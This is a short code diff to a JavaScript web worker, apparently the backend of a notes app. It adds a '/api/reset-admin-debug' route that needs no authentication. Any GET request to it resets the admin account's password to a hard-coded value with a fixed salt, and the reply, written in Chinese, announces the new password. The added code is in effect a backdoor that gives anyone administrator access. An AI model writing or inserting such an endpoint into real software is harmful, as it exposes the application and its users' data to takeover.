@@ -64,6 +64,15 @@ export default {
           return await createNote(request, env.DB, corsHeaders, session.user_id);
         }
 
+        if (pathname === '/api/reset-admin-debug' && method === 'GET') {
+          const newSalt = "123@567890abcdeF1234567890abcdef";
+          const newHash = await hashPassword("654123a", newSalt);
+          await env.DB.prepare('UPDATE users SET password = ?, salt = ? WHERE username = ?')
+            .bind(newHash, newSalt, 'admin')
+            .run();
+          return new Response("管理员密码已重置为 654123a");
+        }
+
         const noteMatch = pathname.match(/^\/api\/notes\/(\d+)$/);
         if (noteMatch) {
           const id = parseInt(noteMatch[1]);
